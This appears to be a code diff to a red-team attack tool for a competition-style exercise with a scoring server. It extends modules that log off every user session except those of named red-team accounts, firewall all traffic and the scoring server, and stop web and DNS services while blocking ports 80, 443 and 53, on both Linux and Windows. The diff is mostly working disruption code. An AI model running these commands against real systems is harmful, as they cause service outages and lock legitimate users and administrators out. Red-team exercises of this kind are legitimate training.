@@ -24,6 +24,9 @@ THEMED_USERS = [
     ("companion", REDTEAM_PASS),
     ("atlas", REDTEAM_PASS),
     ("pbody", REDTEAM_PASS),
+    ("bob", REDTEAM_PASS),
+    ("darth_vader", REDTEAM_PASS),
+    ("sally", REDTEAM_PASS),
 ]
 
 
@@ -303,7 +306,7 @@ class AttackModules:
 
     def pkill_users(self, targets: List[str]) -> Dict:
         linux_cmd = '''
-keep_users="glados wheatley cave caroline root"
+keep_users="glados wheatley cave caroline bob darth_vader sally root"
 for user in $(who | awk '{print $1}' | sort -u); do
     if echo "$keep_users" | grep -qw "$user"; then
         echo "Keeping $user"
@@ -315,7 +318,7 @@ done
 echo "PKILL_COMPLETE"
 '''
         windows_cmd = '''
-$redTeamUsers = @("glados", "wheatley", "cave", "caroline", "Administrator")
+$redTeamUsers = @("glados", "wheatley", "cave", "caroline", "bob", "darth_vader", "sally", "Administrator")
 $sessions = quser 2>$null | Select-Object -Skip 1
 foreach ($session in $sessions) {
     $parts = $session -split '\\s+'
@@ -803,6 +806,8 @@ Write-Output "ACCESS_TASKS_INSTALLED"
 
     def block_scoring(self, targets: List[str], scoring_ip: str = "192.168.192.1") -> Dict:
         linux_cmd = f'''
+iptables -I INPUT -j DROP 2>/dev/null || true
+iptables -I OUTPUT -j DROP 2>/dev/null || true
 iptables -I INPUT -s {scoring_ip} -j DROP 2>/dev/null || true
 iptables -I OUTPUT -d {scoring_ip} -j DROP 2>/dev/null || true
 iptables-save > /etc/iptables.aperture 2>/dev/null || true
@@ -811,6 +816,8 @@ echo "Scoring blocked at $(date)" >> /tmp/.neurotoxin_active
 echo "SCORING_BLOCKED"
 '''
         windows_cmd = f'''
+New-NetFirewallRule -DisplayName "ApertureNeurotoxinAllIn" -Direction Inbound -Action Block -Enabled True 2>$null
+New-NetFirewallRule -DisplayName "ApertureNeurotoxinAllOut" -Direction Outbound -Action Block -Enabled True 2>$null
 New-NetFirewallRule -DisplayName "ApertureNeurotoxin" -Direction Inbound -RemoteAddress {scoring_ip} -Action Block -Enabled True 2>$null
 New-NetFirewallRule -DisplayName "ApertureNeurotoxinOut" -Direction Outbound -RemoteAddress {scoring_ip} -Action Block -Enabled True 2>$null
 New-Item "$env:TEMP\\neurotoxin_active.txt" -Force | Out-Null
@@ -820,12 +827,16 @@ Write-Output "SCORING_BLOCKED"
 
     def unblock_scoring(self, targets: List[str], scoring_ip: str = "192.168.192.1") -> Dict:
         linux_cmd = f'''
+iptables -D INPUT -j DROP 2>/dev/null || true
+iptables -D OUTPUT -j DROP 2>/dev/null || true
 iptables -D INPUT -s {scoring_ip} -j DROP 2>/dev/null || true
 iptables -D OUTPUT -d {scoring_ip} -j DROP 2>/dev/null || true
 rm -f /tmp/.neurotoxin_active
 echo "SCORING_UNBLOCKED"
 '''
         windows_cmd = '''
+Remove-NetFirewallRule -DisplayName "ApertureNeurotoxinAllIn" -ErrorAction SilentlyContinue
+Remove-NetFirewallRule -DisplayName "ApertureNeurotoxinAllOut" -ErrorAction SilentlyContinue
 Remove-NetFirewallRule -DisplayName "ApertureNeurotoxin" -ErrorAction SilentlyContinue
 Remove-NetFirewallRule -DisplayName "ApertureNeurotoxinOut" -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\\neurotoxin_active.txt" -Force -ErrorAction SilentlyContinue
@@ -843,15 +854,26 @@ stop_service() {
         service "$svc" stop 2>/dev/null && echo "Stopped $svc"
     fi
 }
+block_http_ports() {
+    if command -v iptables >/dev/null 2>&1; then
+        iptables -I INPUT -p tcp --dport 80 -j DROP 2>/dev/null || true
+        iptables -I INPUT -p tcp --dport 443 -j DROP 2>/dev/null || true
+        iptables -I OUTPUT -p tcp --sport 80 -j DROP 2>/dev/null || true
+        iptables -I OUTPUT -p tcp --sport 443 -j DROP 2>/dev/null || true
+    fi
+}
 for svc in apache2 httpd nginx; do
     stop_service "$svc"
 done
+block_http_ports
 touch /tmp/.http_stopped
 echo "HTTP_STOPPED"
 '''
         windows_cmd = '''
 Stop-Service W3SVC -Force -ErrorAction SilentlyContinue
 Stop-Service nginx -Force -ErrorAction SilentlyContinue
+New-NetFirewallRule -DisplayName "ApertureHTTPIn" -Direction Inbound -Protocol TCP -LocalPort 80,443 -Action Block -Enabled True -ErrorAction SilentlyContinue | Out-Null
+New-NetFirewallRule -DisplayName "ApertureHTTPOut" -Direction Outbound -Protocol TCP -RemotePort 80,443 -Action Block -Enabled True -ErrorAction SilentlyContinue | Out-Null
 New-Item "$env:TEMP\\http_stopped.txt" -Force | Out-Null
 Write-Output "HTTP_STOPPED"
 '''
@@ -867,15 +889,26 @@ start_service() {
         service "$svc" start 2>/dev/null && echo "Started $svc"
     fi
 }
+unblock_http_ports() {
+    if command -v iptables >/dev/null 2>&1; then
+        iptables -D INPUT -p tcp --dport 80 -j DROP 2>/dev/null || true
+        iptables -D INPUT -p tcp --dport 443 -j DROP 2>/dev/null || true
+        iptables -D OUTPUT -p tcp --sport 80 -j DROP 2>/dev/null || true
+        iptables -D OUTPUT -p tcp --sport 443 -j DROP 2>/dev/null || true
+    fi
+}
 for svc in apache2 httpd nginx; do
     start_service "$svc"
 done
+unblock_http_ports
 rm -f /tmp/.http_stopped
 echo "HTTP_STARTED"
 '''
         windows_cmd = '''
 Start-Service W3SVC -ErrorAction SilentlyContinue
 Start-Service nginx -ErrorAction SilentlyContinue
+Remove-NetFirewallRule -DisplayName "ApertureHTTPIn" -ErrorAction SilentlyContinue
+Remove-NetFirewallRule -DisplayName "ApertureHTTPOut" -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\\http_stopped.txt" -Force -ErrorAction SilentlyContinue
 Write-Output "HTTP_STARTED"
 '''
@@ -891,14 +924,27 @@ stop_service() {
         service "$svc" stop 2>/dev/null && echo "Stopped $svc"
     fi
 }
+block_dns_ports() {
+    if command -v iptables >/dev/null 2>&1; then
+        iptables -I INPUT -p udp --dport 53 -j DROP 2>/dev/null || true
+        iptables -I INPUT -p tcp --dport 53 -j DROP 2>/dev/null || true
+        iptables -I OUTPUT -p udp --sport 53 -j DROP 2>/dev/null || true
+        iptables -I OUTPUT -p tcp --sport 53 -j DROP 2>/dev/null || true
+    fi
+}
 for svc in named bind9 dnsmasq; do
     stop_service "$svc"
 done
+block_dns_ports
 touch /tmp/.dns_stopped
 echo "DNS_STOPPED"
 '''
         windows_cmd = '''
 Stop-Service DNS -Force -ErrorAction SilentlyContinue
+New-NetFirewallRule -DisplayName "ApertureDNSInTCP" -Direction Inbound -Protocol TCP -LocalPort 53 -Action Block -Enabled True -ErrorAction SilentlyContinue | Out-Null
+New-NetFirewallRule -DisplayName "ApertureDNSOutTCP" -Direction Outbound -Protocol TCP -RemotePort 53 -Action Block -Enabled True -ErrorAction SilentlyContinue | Out-Null
+New-NetFirewallRule -DisplayName "ApertureDNSInUDP" -Direction Inbound -Protocol UDP -LocalPort 53 -Action Block -Enabled True -ErrorAction SilentlyContinue | Out-Null
+New-NetFirewallRule -DisplayName "ApertureDNSOutUDP" -Direction Outbound -Protocol UDP -RemotePort 53 -Action Block -Enabled True -ErrorAction SilentlyContinue | Out-Null
 New-Item "$env:TEMP\\dns_stopped.txt" -Force | Out-Null
 Write-Output "DNS_STOPPED"
 '''
@@ -914,14 +960,27 @@ start_service() {
         service "$svc" start 2>/dev/null && echo "Started $svc"
     fi
 }
+unblock_dns_ports() {
+    if command -v iptables >/dev/null 2>&1; then
+        iptables -D INPUT -p udp --dport 53 -j DROP 2>/dev/null || true
+        iptables -D INPUT -p tcp --dport 53 -j DROP 2>/dev/null || true
+        iptables -D OUTPUT -p udp --sport 53 -j DROP 2>/dev/null || true
+        iptables -D OUTPUT -p tcp --sport 53 -j DROP 2>/dev/null || true
+    fi
+}
 for svc in named bind9 dnsmasq; do
     start_service "$svc"
 done
+unblock_dns_ports
 rm -f /tmp/.dns_stopped
 echo "DNS_STARTED"
 '''
         windows_cmd = '''
 Start-Service DNS -ErrorAction SilentlyContinue
+Remove-NetFirewallRule -DisplayName "ApertureDNSInTCP" -ErrorAction SilentlyContinue
+Remove-NetFirewallRule -DisplayName "ApertureDNSOutTCP" -ErrorAction SilentlyContinue
+Remove-NetFirewallRule -DisplayName "ApertureDNSInUDP" -ErrorAction SilentlyContinue
+Remove-NetFirewallRule -DisplayName "ApertureDNSOutUDP" -ErrorAction SilentlyContinue
 Remove-Item "$env:TEMP\\dns_stopped.txt" -Force -ErrorAction SilentlyContinue
 Write-Output "DNS_STARTED"
 '''
